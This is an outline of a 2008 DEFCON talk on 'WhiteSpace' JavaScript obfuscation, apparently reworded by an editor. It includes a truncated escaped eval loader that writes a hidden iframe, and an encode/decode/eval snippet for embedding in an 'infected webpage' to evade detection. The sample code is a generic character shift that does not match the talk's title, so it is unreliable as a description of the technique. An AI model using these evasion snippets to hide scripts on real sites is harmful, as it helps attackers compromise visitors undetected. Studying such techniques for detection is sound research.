# WhiteSpace: A Different Approach to JavaScript Obfuscation
**DEFCON 16, August 2008**
**Presented by: Kolisar**

## 1. Introduction
- **Motivation:** What led to the development of WhiteSpace?

## 2. Agenda
- **Overview of WhiteSpace**
- **Survey of Current JavaScript Obfuscation Methods**
- **Telltale Indicators of Obfuscation**
- **Components of the WhiteSpace Approach**
- **Live Demonstration**

## 3. What is “WhiteSpace”?
- **Definition:** A novel approach to JavaScript obfuscation.
- **Key Features:**
  - Conceals typical indicators of obfuscation.
  - Undetectable by standard automated and manual detection methods.

## 4. JavaScript Obfuscation Methods
- **Common Targets for Encoding:**
  - Exploit code
  - Hidden iFrames

### 4.1 Escaped ASCII/Unicode Values
```javascript
eval(unescape('%77%69%6e%64%6f%77%2e%73%74%61%74%75%73%3d%27%44%6f%6e%65%27%3b%64%6f...%35%35%20%68%65%69%67%68%74%3d%35%31%31%20%73%74%79%6c%65%3d%5c%27%64%69%73%70%6c%61%79%3a%20%6e%6f%6e%65%5c%27%3e%3c%2f%69%66%72%61%6d%65%3e%27%29'));
document.write('\u003c\u0069\u0066\u0072\u0061\u006d\u0065\u0020\u0073\u0072\u0063\u003d\u0027\u0068\u0074\u0074\u0070... \u0065\u006e\u003b\u0027\u003e\u003c\u002f\u0069\u0066\u0072\u0061\u006d\u0065\u003e');
```

### 4.2 XOR (ASCII values)
```javascript
function xor_str(plain_str, xor_key) {
    var xored_str = "";
    for (var i = 0; i < plain_str.length; i++) {
        xored_str += String.fromCharCode(plain_str.charCodeAt(i) ^ xor_key);
    }
    return xored_str;
}
```

### 4.3 Base64 Encoding
```javascript
var encoded = btoa("Your string here");
var decoded = atob(encoded);
```

### 4.4 Non-encryption based Obfuscation
- **Techniques:**
  - Using non-obvious variable and function names
  - Example:
    ```javascript
    function v47d9df3cf15f9(v47d9df3cf1ddf) {
        function v47d9df3cf25b0() { return 16; }
        ...
        function v47d9df3d01281() {
            var v47d9df3d01a56 = 2;
            return v47d9df3d01a56;
        }
        var v47d9df3d002d9 = '';
        for (v47d9df3d00aac = 0; v47d9df3d00aac < v47d9df3d00a9c; v47d9df3d00aac++) {
            ...
        }
    }
    ```

## 5. Telltale Indicators of Obfuscation
- **Common Indicators:**
  - Unusual use of `eval`
  - Excessive use of `String.fromCharCode`
  - Complex and unreadable code structures

## 6. Components of the WhiteSpace Approach
- **Key Components:**
  - **Encoding Mechanism:** Details of the encoding process
  - **Decoding Mechanism:** How the encoded script is decoded
  - **Integration:** Embedding the decoding code in the infected webpage

### 6.1 Encoding Mechanism
- **Example:**
  ```javascript
  function encode(str) {
      var encoded = "";
      for (var i = 0; i < str.length; i++) {
          encoded += String.fromCharCode(str.charCodeAt(i) + 1);
      }
      return encoded;
  }
  ```

### 6.2 Decoding Mechanism
- **Example:**
  ```javascript
  function decode(encoded) {
      var decoded = "";
      for (var i = 0; i < encoded.length; i++) {
          decoded += String.fromCharCode(encoded.charCodeAt(i) - 1);
      }
      return decoded;
  }
  ```

### 6.3 Integration
- **Embedding the Decoding Code:**
  ```html
  <script>
      var encodedScript = "Encoded script here";
      var decodedScript = decode(encodedScript);
      eval(decodedScript);
  </script>
  ```

## 7. Live Demonstration
- **Demo of the WhiteSpace approach in action.**

## 8. Limitations
- **Current Limitations:**
  - The decoding code must be included in the infected webpage.
  - Potential workarounds are being explored.

## 9. Acknowledgments
- **Special Thanks:**
  - 장인섭 (Insub Chang)
  - Gar Morley
  - JA

## 10. Questions
- **Open Floor for Questions and Discussion.**

---

This optimized version of the text is more structured, clear, and professional, making it easier to follow and understand.